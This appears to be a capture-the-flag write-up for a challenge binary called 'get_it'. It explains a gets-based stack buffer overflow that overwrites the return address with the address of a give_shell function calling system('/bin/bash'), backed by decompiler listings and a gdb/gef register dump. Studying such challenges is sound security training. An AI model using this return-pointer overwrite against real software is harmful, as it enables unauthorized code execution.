# Get_it Writeup

## Important Note
THIS DOES NOT WORK. The system call is no longer functional, step through in gdb to ensure give_shell is called but a shell will not be opened

## Steps
1. Same process as warmup, just a different stack variable layout and the address of the function we want to call is not given
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined1[32]    Stack[-0x28]   input                                   XREF[1]:     004005e0(*)  
             undefined4        Stack[-0x2c]:4 local_2c                                XREF[1]:     004005cf(W)  
             undefined8        Stack[-0x38]:8 local_38                                XREF[1]:     004005d2(W)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:004004dd(*), 004006c4, 
                                                                                          00400778(*)  
        004005c7 55              PUSH       RBP
```
input is at `Stack[-0x28]`, which is 40 in decimal.
Since input is read through `gets`, we can access and change the return pointer to the `give_shell` function to give us a shell
```
void give_shell(void)
{
  system("/bin/bash");
  return;
}
```
2. Identify address of `give_shell` which is `0x004005b6`
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined give_shell()
             undefined         <UNASSIGNED>   <RETURN>
                             give_shell                                      XREF[3]:     Entry Point(*), 004006bc, 
                                                                                          00400758(*)  
        004005b6 55              PUSH       RBP
        004005b7 48 89 e5        MOV        RBP,RSP

```

3. Create a payload overwriting the 40 bytes from 'input' to the return pointer and set it to equal `0x4005b6`

4. Send Payload to process


## Solution
Viewed in gdb gef
```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x31              
[ Legend: Modified register | Code | Heap | Stack | String ]
[ Legend: Modified register | Code | Heap | Stack | String ]
[ Legend: Modified register | Code | Heap | Stack | String ]
[ Legend: Modified register | Code | Heap | Stack | String ]
[ Legend: Modified register | Code | Heap | Stack | String ]
[ Legend: Modified register | Code | Heap | Stack | String ]
[ Legend: Modified register | Code | Heap | Stack | String ]
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
[ Legend: Modified register | Code | Heap | Stack | String ]
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x41              
$rbx   : 0x00007fff0affdfc0  →  0x0000000000000041 ("A"?)
$rcx   : 0xa               
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007fff0affe0f8  →  0x00007fff0afff1ca  →  "./get_it"
$rcx   : 0x00007f7271d9f8e0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fff0affdfe8  →  "AAAAAAAA"
$rbp   : 0x00007fff0affdfe8  →  "AAAAAAAA"
$rsi   : 0x00000000075086b1  →  0x4141414141414141 ("AAAAAAAA"?)
$rdi   : 0x0000000000400684  →  "/bin/bash"
$rip   : 0x00000000004005bf  →  <give_shell+0009> call 0x400480 <system@plt>
$r8    : 0x00000000075086e1  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x302             
$r12   : 0x0               
$r13   : 0x00007fff0affe108  →  0x00007fff0afff1d3  →  "COLORFGBG=15;0"
$r14   : 0x00007f7271e04000  →  0x00007f7271e05310  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff0affdfe8│+0x0000: "AAAAAAAA"   ← $rsp, $rbp
0x00007fff0affdff0│+0x0008: 0x0000000000000000
0x00007fff0affdff8│+0x0010: 0x00000000004005c7  →  <main+0000> push rbp
0x00007fff0affe000│+0x0018: 0x0000000100000000
0x00007fff0affe008│+0x0020: 0x00007fff0affe0f8  →  0x00007fff0afff1ca  →  "./get_it"
0x00007fff0affe010│+0x0028: 0x00007fff0affe0f8  →  0x00007fff0afff1ca  →  "./get_it"
0x00007fff0affe018│+0x0030: 0x2ef150b47d967602
0x00007fff0affe020│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005b6 <give_shell+0000> push   rbp
     0x4005b7 <give_shell+0001> mov    rbp, rsp
     0x4005ba <give_shell+0004> mov    edi, 0x400684
 →   0x4005bf <give_shell+0009> call   0x400480 <system@plt>
   ↳    0x400480 <system@plt+0000> jmp    QWORD PTR [rip+0x200b9a]        # 0x601020 <system@got.plt>
        0x400486 <system@plt+0006> push   0x1
        0x40048b <system@plt+000b> jmp    0x400460
        0x400490 <__libc_start_main@plt+0000> jmp    QWORD PTR [rip+0x200b92]        # 0x601028 <__libc_start_main@got.plt>
        0x400496 <__libc_start_main@plt+0006> push   0x2
        0x40049b <__libc_start_main@plt+000b> jmp    0x400460
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
system@plt (
   $rdi = 0x0000000000400684 → "/bin/bash" # ensure this is here
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005bf in give_shell (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005bf → give_shell()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  

```
